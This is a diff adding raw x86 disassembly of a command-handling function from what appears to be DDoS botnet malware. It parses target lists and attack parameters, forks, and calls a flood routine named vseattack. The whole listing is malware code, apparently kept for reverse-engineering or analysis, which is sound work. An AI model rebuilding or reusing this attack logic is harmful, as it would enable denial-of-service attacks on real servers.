+ 804d9b9: 8b bd 3c fd ff ff            	movl	-0x2c4(%ebp), %edi
+ 804d9bf: 8b 8d 38 fd ff ff            	movl	-0x2c8(%ebp), %ecx
+ 804d9c5: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804d9c7: 0f 97 c2                     	seta	%dl
+ 804d9ca: 0f 92 c0                     	setb	%al
+ 804d9cd: 88 d1                        	movb	%dl, %cl
+ 804d9cf: 28 c1                        	subb	%al, %cl
+ 804d9d1: 88 c8                        	movb	%cl, %al
+ 804d9d3: 0f be c0                     	movsbl	%al, %eax
+ 804d9d6: 85 c0                        	testl	%eax, %eax
+ 804d9d8: 0f 85 dc 02 00 00            	jne	0x804dcba <processCmd+0x1ecc>
+ 804d9de: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804d9e2: 0f 8e e0 07 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804d9e8: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804d9eb: 83 c0 0c                     	addl	$0xc, %eax
+ 804d9ee: 8b 00                        	movl	(%eax), %eax
+ 804d9f0: 89 04 24                     	movl	%eax, (%esp)
+ 804d9f3: e8 e4 59 00 00               	calll	0x80533dc <atol>
+ 804d9f8: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804d9fb: 0f 84 c7 07 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804da01: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da04: 83 c0 0c                     	addl	$0xc, %eax
+ 804da07: 8b 00                        	movl	(%eax), %eax
+ 804da09: 89 04 24                     	movl	%eax, (%esp)
+ 804da0c: e8 cb 59 00 00               	calll	0x80533dc <atol>
+ 804da11: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804da16: 0f 8f ac 07 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804da1c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da1f: 83 c0 08                     	addl	$0x8, %eax
+ 804da22: 8b 00                        	movl	(%eax), %eax
+ 804da24: 89 04 24                     	movl	%eax, (%esp)
+ 804da27: e8 b0 59 00 00               	calll	0x80533dc <atol>
+ 804da2c: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804da2f: 0f 84 93 07 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804da35: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da38: 83 c0 10                     	addl	$0x10, %eax
+ 804da3b: 8b 00                        	movl	(%eax), %eax
+ 804da3d: 89 04 24                     	movl	%eax, (%esp)
+ 804da40: e8 97 59 00 00               	calll	0x80533dc <atol>
+ 804da45: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804da48: 0f 84 7a 07 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804da4e: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da51: 83 c0 14                     	addl	$0x14, %eax
+ 804da54: 8b 00                        	movl	(%eax), %eax
+ 804da56: 89 04 24                     	movl	%eax, (%esp)
+ 804da59: e8 7e 59 00 00               	calll	0x80533dc <atol>
+ 804da5e: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804da61: 0f 84 61 07 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804da67: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da6a: 83 c0 14                     	addl	$0x14, %eax
+ 804da6d: 8b 00                        	movl	(%eax), %eax
+ 804da6f: 89 04 24                     	movl	%eax, (%esp)
+ 804da72: e8 65 59 00 00               	calll	0x80533dc <atol>
+ 804da77: 3d 00 00 01 00               	cmpl	$0x10000, %eax          # imm = 0x10000
+ 804da7c: 0f 8f 46 07 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804da82: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804da85: 83 c0 14                     	addl	$0x14, %eax
+ 804da88: 8b 00                        	movl	(%eax), %eax
+ 804da8a: 89 04 24                     	movl	%eax, (%esp)
+ 804da8d: e8 4a 59 00 00               	calll	0x80533dc <atol>
+ 804da92: 3d dc ff 00 00               	cmpl	$0xffdc, %eax           # imm = 0xFFDC
+ 804da97: 0f 8f 2b 07 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804da9d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804daa0: 83 c0 10                     	addl	$0x10, %eax
+ 804daa3: 8b 00                        	movl	(%eax), %eax
+ 804daa5: 89 04 24                     	movl	%eax, (%esp)
+ 804daa8: e8 2f 59 00 00               	calll	0x80533dc <atol>
+ 804daad: 83 f8 20                     	cmpl	$0x20, %eax
+ 804dab0: 0f 8f 12 07 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804dab6: 83 7d 08 07                  	cmpl	$0x7, 0x8(%ebp)
+ 804daba: 75 19                        	jne	0x804dad5 <processCmd+0x1ce7>
+ 804dabc: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dabf: 83 c0 18                     	addl	$0x18, %eax
+ 804dac2: 8b 00                        	movl	(%eax), %eax
+ 804dac4: 89 04 24                     	movl	%eax, (%esp)
+ 804dac7: e8 10 59 00 00               	calll	0x80533dc <atol>
+ 804dacc: 85 c0                        	testl	%eax, %eax
+ 804dace: 7f 05                        	jg	0x804dad5 <processCmd+0x1ce7>
+ 804dad0: e9 f3 06 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804dad5: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dad8: 83 c0 04                     	addl	$0x4, %eax
+ 804dadb: 8b 00                        	movl	(%eax), %eax
+ 804dadd: 89 45 90                     	movl	%eax, -0x70(%ebp)
+ 804dae0: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dae3: 83 c0 08                     	addl	$0x8, %eax
+ 804dae6: 8b 00                        	movl	(%eax), %eax
+ 804dae8: 89 04 24                     	movl	%eax, (%esp)
+ 804daeb: e8 ec 58 00 00               	calll	0x80533dc <atol>
+ 804daf0: 89 45 94                     	movl	%eax, -0x6c(%ebp)
+ 804daf3: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804daf6: 83 c0 0c                     	addl	$0xc, %eax
+ 804daf9: 8b 00                        	movl	(%eax), %eax
+ 804dafb: 89 04 24                     	movl	%eax, (%esp)
+ 804dafe: e8 d9 58 00 00               	calll	0x80533dc <atol>
+ 804db03: 89 45 98                     	movl	%eax, -0x68(%ebp)
+ 804db06: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804db09: 83 c0 10                     	addl	$0x10, %eax
+ 804db0c: 8b 00                        	movl	(%eax), %eax
+ 804db0e: 89 04 24                     	movl	%eax, (%esp)
+ 804db11: e8 c6 58 00 00               	calll	0x80533dc <atol>
+ 804db16: 89 45 9c                     	movl	%eax, -0x64(%ebp)
+ 804db19: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804db1c: 83 c0 14                     	addl	$0x14, %eax
+ 804db1f: 8b 00                        	movl	(%eax), %eax
+ 804db21: 89 04 24                     	movl	%eax, (%esp)
+ 804db24: e8 b3 58 00 00               	calll	0x80533dc <atol>
+ 804db29: 89 45 a0                     	movl	%eax, -0x60(%ebp)
+ 804db2c: 83 7d 08 06                  	cmpl	$0x6, 0x8(%ebp)
+ 804db30: 7e 18                        	jle	0x804db4a <processCmd+0x1d5c>
+ 804db32: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804db35: 83 c0 18                     	addl	$0x18, %eax
+ 804db38: 8b 00                        	movl	(%eax), %eax
+ 804db3a: 89 04 24                     	movl	%eax, (%esp)
+ 804db3d: e8 9a 58 00 00               	calll	0x80533dc <atol>
+ 804db42: 89 85 08 fe ff ff            	movl	%eax, -0x1f8(%ebp)
+ 804db48: eb 0a                        	jmp	0x804db54 <processCmd+0x1d66>
+ 804db4a: c7 85 08 fe ff ff e8 03 00 00	movl	$0x3e8, -0x1f8(%ebp)    # imm = 0x3E8
+ 804db54: 8b b5 08 fe ff ff            	movl	-0x1f8(%ebp), %esi
+ 804db5a: 89 75 a4                     	movl	%esi, -0x5c(%ebp)
+ 804db5d: 83 7d 08 07                  	cmpl	$0x7, 0x8(%ebp)
+ 804db61: 7e 18                        	jle	0x804db7b <processCmd+0x1d8d>
+ 804db63: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804db66: 83 c0 1c                     	addl	$0x1c, %eax
+ 804db69: 8b 00                        	movl	(%eax), %eax
+ 804db6b: 89 04 24                     	movl	%eax, (%esp)
+ 804db6e: e8 69 58 00 00               	calll	0x80533dc <atol>
+ 804db73: 89 85 0c fe ff ff            	movl	%eax, -0x1f4(%ebp)
+ 804db79: eb 0a                        	jmp	0x804db85 <processCmd+0x1d97>
+ 804db7b: c7 85 0c fe ff ff 40 42 0f 00	movl	$0xf4240, -0x1f4(%ebp)  # imm = 0xF4240
+ 804db85: 8b bd 0c fe ff ff            	movl	-0x1f4(%ebp), %edi
+ 804db8b: 89 7d a8                     	movl	%edi, -0x58(%ebp)
+ 804db8e: 83 7d 08 08                  	cmpl	$0x8, 0x8(%ebp)
+ 804db92: 7e 18                        	jle	0x804dbac <processCmd+0x1dbe>
+ 804db94: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804db97: 83 c0 20                     	addl	$0x20, %eax
+ 804db9a: 8b 00                        	movl	(%eax), %eax
+ 804db9c: 89 04 24                     	movl	%eax, (%esp)
+ 804db9f: e8 38 58 00 00               	calll	0x80533dc <atol>
+ 804dba4: 89 85 10 fe ff ff            	movl	%eax, -0x1f0(%ebp)
+ 804dbaa: eb 0a                        	jmp	0x804dbb6 <processCmd+0x1dc8>
+ 804dbac: c7 85 10 fe ff ff 00 00 00 00	movl	$0x0, -0x1f0(%ebp)
+ 804dbb6: 8b 85 10 fe ff ff            	movl	-0x1f0(%ebp), %eax
+ 804dbbc: 89 45 ac                     	movl	%eax, -0x54(%ebp)
+ 804dbbf: 8b 45 90                     	movl	-0x70(%ebp), %eax
+ 804dbc2: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804dbca: 89 04 24                     	movl	%eax, (%esp)
+ 804dbcd: e8 8e 39 00 00               	calll	0x8051560 <strchr>
+ 804dbd2: 85 c0                        	testl	%eax, %eax
+ 804dbd4: 0f 84 8b 00 00 00            	je	0x804dc65 <processCmd+0x1e77>
+ 804dbda: 8b 45 90                     	movl	-0x70(%ebp), %eax
+ 804dbdd: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804dbe5: 89 04 24                     	movl	%eax, (%esp)
+ 804dbe8: e8 c7 3b 00 00               	calll	0x80517b4 <strtok>
+ 804dbed: 89 45 b0                     	movl	%eax, -0x50(%ebp)
+ 804dbf0: eb 68                        	jmp	0x804dc5a <processCmd+0x1e6c>
+ 804dbf2: e8 5e bb ff ff               	calll	0x8049755 <listFork>
+ 804dbf7: 85 c0                        	testl	%eax, %eax
+ 804dbf9: 75 48                        	jne	0x804dc43 <processCmd+0x1e55>
+ 804dbfb: 8b 45 ac                     	movl	-0x54(%ebp), %eax
+ 804dbfe: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804dc02: 8b 45 a8                     	movl	-0x58(%ebp), %eax
+ 804dc05: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804dc09: 8b 45 a4                     	movl	-0x5c(%ebp), %eax
+ 804dc0c: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804dc10: 8b 45 a0                     	movl	-0x60(%ebp), %eax
+ 804dc13: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804dc17: 8b 45 9c                     	movl	-0x64(%ebp), %eax
+ 804dc1a: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804dc1e: 8b 45 98                     	movl	-0x68(%ebp), %eax
+ 804dc21: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804dc25: 8b 45 94                     	movl	-0x6c(%ebp), %eax
+ 804dc28: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804dc2c: 8b 45 b0                     	movl	-0x50(%ebp), %eax
+ 804dc2f: 89 04 24                     	movl	%eax, (%esp)
+ 804dc32: e8 3a d6 ff ff               	calll	0x804b271 <vseattack>
+ 804dc37: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804dc3e: e8 75 25 00 00               	calll	0x80501b8 <_exit>
+ 804dc43: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804dc4b: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804dc52: e8 5d 3b 00 00               	calll	0x80517b4 <strtok>
+ 804dc57: 89 45 b0                     	movl	%eax, -0x50(%ebp)
+ 804dc5a: 83 7d b0 00                  	cmpl	$0x0, -0x50(%ebp)
+ 804dc5e: 75 92                        	jne	0x804dbf2 <processCmd+0x1e04>
+ 804dc60: e9 63 05 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804dc65: e8 eb ba ff ff               	calll	0x8049755 <listFork>
+ 804dc6a: 85 c0                        	testl	%eax, %eax
+ 804dc6c: 0f 85 56 05 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804dc72: 8b 45 ac                     	movl	-0x54(%ebp), %eax
+ 804dc75: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804dc79: 8b 45 a8                     	movl	-0x58(%ebp), %eax
+ 804dc7c: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804dc80: 8b 45 a4                     	movl	-0x5c(%ebp), %eax
+ 804dc83: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804dc87: 8b 45 a0                     	movl	-0x60(%ebp), %eax
+ 804dc8a: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804dc8e: 8b 45 9c                     	movl	-0x64(%ebp), %eax
+ 804dc91: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804dc95: 8b 45 98                     	movl	-0x68(%ebp), %eax
+ 804dc98: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804dc9c: 8b 45 94                     	movl	-0x6c(%ebp), %eax
+ 804dc9f: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804dca3: 8b 45 90                     	movl	-0x70(%ebp), %eax
+ 804dca6: 89 04 24                     	movl	%eax, (%esp)
+ 804dca9: e8 c3 d5 ff ff               	calll	0x804b271 <vseattack>
+ 804dcae: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804dcb5: e8 fe 24 00 00               	calll	0x80501b8 <_exit>
+ 804dcba: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dcbd: 8b 00                        	movl	(%eax), %eax
+ 804dcbf: 89 85 34 fd ff ff            	movl	%eax, -0x2cc(%ebp)
+ 804dcc5: c7 85 30 fd ff ff 3f 8e 05 08	movl	$0x8058e3f, -0x2d0(%ebp) # imm = 0x8058E3F
+ 804dccf: c7 85 2c fd ff ff 04 00 00 00	movl	$0x4, -0x2d4(%ebp)
+ 804dcd9: fc                           	cld
+ 804dcda: 8b b5 34 fd ff ff            	movl	-0x2cc(%ebp), %esi
+ 804dce0: 8b bd 30 fd ff ff            	movl	-0x2d0(%ebp), %edi
+ 804dce6: 8b 8d 2c fd ff ff            	movl	-0x2d4(%ebp), %ecx
+ 804dcec: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804dcee: 0f 97 c2                     	seta	%dl
+ 804dcf1: 0f 92 c0                     	setb	%al
+ 804dcf4: 88 d1                        	movb	%dl, %cl
+ 804dcf6: 28 c1                        	subb	%al, %cl
+ 804dcf8: 88 c8                        	movb	%cl, %al
+ 804dcfa: 0f be c0                     	movsbl	%al, %eax
+ 804dcfd: 85 c0                        	testl	%eax, %eax
+ 804dcff: 0f 85 25 02 00 00            	jne	0x804df2a <processCmd+0x213c>
+ 804dd05: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804dd09: 0f 8e b9 04 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804dd0f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd12: 83 c0 0c                     	addl	$0xc, %eax
+ 804dd15: 8b 00                        	movl	(%eax), %eax
+ 804dd17: 89 04 24                     	movl	%eax, (%esp)
+ 804dd1a: e8 bd 56 00 00               	calll	0x80533dc <atol>
+ 804dd1f: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804dd22: 0f 84 a0 04 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804dd28: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd2b: 83 c0 0c                     	addl	$0xc, %eax
+ 804dd2e: 8b 00                        	movl	(%eax), %eax
+ 804dd30: 89 04 24                     	movl	%eax, (%esp)
+ 804dd33: e8 a4 56 00 00               	calll	0x80533dc <atol>
+ 804dd38: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804dd3d: 0f 8f 85 04 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804dd43: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd46: 83 c0 08                     	addl	$0x8, %eax
+ 804dd49: 8b 00                        	movl	(%eax), %eax
+ 804dd4b: 89 04 24                     	movl	%eax, (%esp)
+ 804dd4e: e8 89 56 00 00               	calll	0x80533dc <atol>
+ 804dd53: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804dd56: 75 05                        	jne	0x804dd5d <processCmd+0x1f6f>
+ 804dd58: e9 6b 04 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804dd5d: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd60: 83 c0 04                     	addl	$0x4, %eax
+ 804dd63: 8b 00                        	movl	(%eax), %eax
+ 804dd65: 89 45 b4                     	movl	%eax, -0x4c(%ebp)
+ 804dd68: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd6b: 83 c0 08                     	addl	$0x8, %eax
+ 804dd6e: 8b 00                        	movl	(%eax), %eax
+ 804dd70: 89 04 24                     	movl	%eax, (%esp)
+ 804dd73: e8 64 56 00 00               	calll	0x80533dc <atol>
+ 804dd78: 89 45 b8                     	movl	%eax, -0x48(%ebp)
+ 804dd7b: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dd7e: 83 c0 0c                     	addl	$0xc, %eax
+ 804dd81: 8b 00                        	movl	(%eax), %eax
+ 804dd83: 89 04 24                     	movl	%eax, (%esp)
+ 804dd86: e8 51 56 00 00               	calll	0x80533dc <atol>
+ 804dd8b: 89 45 bc                     	movl	%eax, -0x44(%ebp)
+ 804dd8e: c7 45 c0 20 00 00 00         	movl	$0x20, -0x40(%ebp)
+ 804dd95: c7 45 c4 00 04 00 00         	movl	$0x400, -0x3c(%ebp)     # imm = 0x400
+ 804dd9c: 83 7d 08 04                  	cmpl	$0x4, 0x8(%ebp)
+ 804dda0: 7e 18                        	jle	0x804ddba <processCmd+0x1fcc>
+ 804dda2: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dda5: 83 c0 10                     	addl	$0x10, %eax
+ 804dda8: 8b 00                        	movl	(%eax), %eax
+ 804ddaa: 89 04 24                     	movl	%eax, (%esp)
+ 804ddad: e8 2a 56 00 00               	calll	0x80533dc <atol>
+ 804ddb2: 89 85 14 fe ff ff            	movl	%eax, -0x1ec(%ebp)
+ 804ddb8: eb 0a                        	jmp	0x804ddc4 <processCmd+0x1fd6>
+ 804ddba: c7 85 14 fe ff ff e8 03 00 00	movl	$0x3e8, -0x1ec(%ebp)    # imm = 0x3E8
+ 804ddc4: 8b b5 14 fe ff ff            	movl	-0x1ec(%ebp), %esi
+ 804ddca: 89 75 c8                     	movl	%esi, -0x38(%ebp)
+ 804ddcd: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804ddd1: 7e 18                        	jle	0x804ddeb <processCmd+0x1ffd>
+ 804ddd3: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804ddd6: 83 c0 14                     	addl	$0x14, %eax
+ 804ddd9: 8b 00                        	movl	(%eax), %eax
+ 804dddb: 89 04 24                     	movl	%eax, (%esp)
+ 804ddde: e8 f9 55 00 00               	calll	0x80533dc <atol>
+ 804dde3: 89 85 18 fe ff ff            	movl	%eax, -0x1e8(%ebp)
+ 804dde9: eb 0a                        	jmp	0x804ddf5 <processCmd+0x2007>
+ 804ddeb: c7 85 18 fe ff ff 40 42 0f 00	movl	$0xf4240, -0x1e8(%ebp)  # imm = 0xF4240
+ 804ddf5: 8b bd 18 fe ff ff            	movl	-0x1e8(%ebp), %edi
+ 804ddfb: 89 7d cc                     	movl	%edi, -0x34(%ebp)
+ 804ddfe: 83 7d 08 06                  	cmpl	$0x6, 0x8(%ebp)
+ 804de02: 7e 18                        	jle	0x804de1c <processCmd+0x202e>
+ 804de04: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804de07: 83 c0 18                     	addl	$0x18, %eax
+ 804de0a: 8b 00                        	movl	(%eax), %eax
+ 804de0c: 89 04 24                     	movl	%eax, (%esp)
+ 804de0f: e8 c8 55 00 00               	calll	0x80533dc <atol>
+ 804de14: 89 85 1c fe ff ff            	movl	%eax, -0x1e4(%ebp)
+ 804de1a: eb 0a                        	jmp	0x804de26 <processCmd+0x2038>
+ 804de1c: c7 85 1c fe ff ff 00 00 00 00	movl	$0x0, -0x1e4(%ebp)
+ 804de26: 8b 85 1c fe ff ff            	movl	-0x1e4(%ebp), %eax
+ 804de2c: 89 45 d0                     	movl	%eax, -0x30(%ebp)
+ 804de2f: 8b 45 b4                     	movl	-0x4c(%ebp), %eax
+ 804de32: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804de3a: 89 04 24                     	movl	%eax, (%esp)
+ 804de3d: e8 1e 37 00 00               	calll	0x8051560 <strchr>
+ 804de42: 85 c0                        	testl	%eax, %eax
+ 804de44: 0f 84 8b 00 00 00            	je	0x804ded5 <processCmd+0x20e7>
+ 804de4a: 8b 45 b4                     	movl	-0x4c(%ebp), %eax
+ 804de4d: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804de55: 89 04 24                     	movl	%eax, (%esp)
+ 804de58: e8 57 39 00 00               	calll	0x80517b4 <strtok>
+ 804de5d: 89 45 d4                     	movl	%eax, -0x2c(%ebp)
+ 804de60: eb 68                        	jmp	0x804deca <processCmd+0x20dc>
+ 804de62: e8 ee b8 ff ff               	calll	0x8049755 <listFork>
+ 804de67: 85 c0                        	testl	%eax, %eax
+ 804de69: 75 48                        	jne	0x804deb3 <processCmd+0x20c5>
+ 804de6b: 8b 45 d0                     	movl	-0x30(%ebp), %eax
+ 804de6e: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804de72: 8b 45 cc                     	movl	-0x34(%ebp), %eax
+ 804de75: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804de79: 8b 45 c8                     	movl	-0x38(%ebp), %eax
+ 804de7c: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804de80: 8b 45 c4                     	movl	-0x3c(%ebp), %eax
+ 804de83: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804de87: 8b 45 c0                     	movl	-0x40(%ebp), %eax
+ 804de8a: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804de8e: 8b 45 bc                     	movl	-0x44(%ebp), %eax
+ 804de91: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804de95: 8b 45 b8                     	movl	-0x48(%ebp), %eax
+ 804de98: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804de9c: 8b 45 d4                     	movl	-0x2c(%ebp), %eax
+ 804de9f: 89 04 24                     	movl	%eax, (%esp)
+ 804dea2: e8 ca d3 ff ff               	calll	0x804b271 <vseattack>
+ 804dea7: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804deae: e8 05 23 00 00               	calll	0x80501b8 <_exit>
+ 804deb3: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804debb: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804dec2: e8 ed 38 00 00               	calll	0x80517b4 <strtok>
+ 804dec7: 89 45 d4                     	movl	%eax, -0x2c(%ebp)
+ 804deca: 83 7d d4 00                  	cmpl	$0x0, -0x2c(%ebp)
+ 804dece: 75 92                        	jne	0x804de62 <processCmd+0x2074>
+ 804ded0: e9 f3 02 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804ded5: e8 7b b8 ff ff               	calll	0x8049755 <listFork>
+ 804deda: 85 c0                        	testl	%eax, %eax
+ 804dedc: 0f 85 e6 02 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804dee2: 8b 45 d0                     	movl	-0x30(%ebp), %eax
+ 804dee5: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804dee9: 8b 45 cc                     	movl	-0x34(%ebp), %eax
+ 804deec: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804def0: 8b 45 c8                     	movl	-0x38(%ebp), %eax
+ 804def3: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804def7: 8b 45 c4                     	movl	-0x3c(%ebp), %eax
+ 804defa: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804defe: 8b 45 c0                     	movl	-0x40(%ebp), %eax
+ 804df01: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804df05: 8b 45 bc                     	movl	-0x44(%ebp), %eax
+ 804df08: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804df0c: 8b 45 b8                     	movl	-0x48(%ebp), %eax
+ 804df0f: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804df13: 8b 45 b4                     	movl	-0x4c(%ebp), %eax
+ 804df16: 89 04 24                     	movl	%eax, (%esp)
+ 804df19: e8 53 d3 ff ff               	calll	0x804b271 <vseattack>
+ 804df1e: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804df25: e8 8e 22 00 00               	calll	0x80501b8 <_exit>
+ 804df2a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804df2d: 8b 00                        	movl	(%eax), %eax
+ 804df2f: 89 85 28 fd ff ff            	movl	%eax, -0x2d8(%ebp)
+ 804df35: c7 85 24 fd ff ff 43 8e 05 08	movl	$0x8058e43, -0x2dc(%ebp) # imm = 0x8058E43
+ 804df3f: c7 85 20 fd ff ff 04 00 00 00	movl	$0x4, -0x2e0(%ebp)
+ 804df49: fc                           	cld
+ 804df4a: 8b b5 28 fd ff ff            	movl	-0x2d8(%ebp), %esi
+ 804df50: 8b bd 24 fd ff ff            	movl	-0x2dc(%ebp), %edi
+ 804df56: 8b 8d 20 fd ff ff            	movl	-0x2e0(%ebp), %ecx
+ 804df5c: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804df5e: 0f 97 c2                     	seta	%dl
+ 804df61: 0f 92 c0                     	setb	%al
+ 804df64: 88 d1                        	movb	%dl, %cl
+ 804df66: 28 c1                        	subb	%al, %cl
+ 804df68: 88 c8                        	movb	%cl, %al
+ 804df6a: 0f be c0                     	movsbl	%al, %eax
+ 804df6d: 85 c0                        	testl	%eax, %eax
+ 804df6f: 0f 85 42 01 00 00            	jne	0x804e0b7 <processCmd+0x22c9>
+ 804df75: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804df79: 0f 8e 49 02 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804df7f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804df82: 83 c0 08                     	addl	$0x8, %eax
+ 804df85: 8b 00                        	movl	(%eax), %eax
+ 804df87: 89 04 24                     	movl	%eax, (%esp)
+ 804df8a: e8 4d 54 00 00               	calll	0x80533dc <atol>
+ 804df8f: 85 c0                        	testl	%eax, %eax
+ 804df91: 0f 8e 31 02 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804df97: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804df9a: 83 c0 0c                     	addl	$0xc, %eax
+ 804df9d: 8b 00                        	movl	(%eax), %eax
+ 804df9f: 89 04 24                     	movl	%eax, (%esp)
+ 804dfa2: e8 35 54 00 00               	calll	0x80533dc <atol>
+ 804dfa7: 85 c0                        	testl	%eax, %eax
+ 804dfa9: 0f 8e 19 02 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804dfaf: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dfb2: 83 c0 0c                     	addl	$0xc, %eax
+ 804dfb5: 8b 00                        	movl	(%eax), %eax
+ 804dfb7: 89 04 24                     	movl	%eax, (%esp)
+ 804dfba: e8 1d 54 00 00               	calll	0x80533dc <atol>
+ 804dfbf: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804dfc4: 7e 05                        	jle	0x804dfcb <processCmd+0x21dd>
+ 804dfc6: e9 fd 01 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804dfcb: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dfce: 83 c0 04                     	addl	$0x4, %eax
+ 804dfd1: 8b 00                        	movl	(%eax), %eax
+ 804dfd3: 89 45 d8                     	movl	%eax, -0x28(%ebp)
+ 804dfd6: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804dfd9: 83 c0 08                     	addl	$0x8, %eax
+ 804dfdc: 8b 00                        	movl	(%eax), %eax
+ 804dfde: 89 04 24                     	movl	%eax, (%esp)
+ 804dfe1: e8 f6 53 00 00               	calll	0x80533dc <atol>
+ 804dfe6: 89 45 dc                     	movl	%eax, -0x24(%ebp)
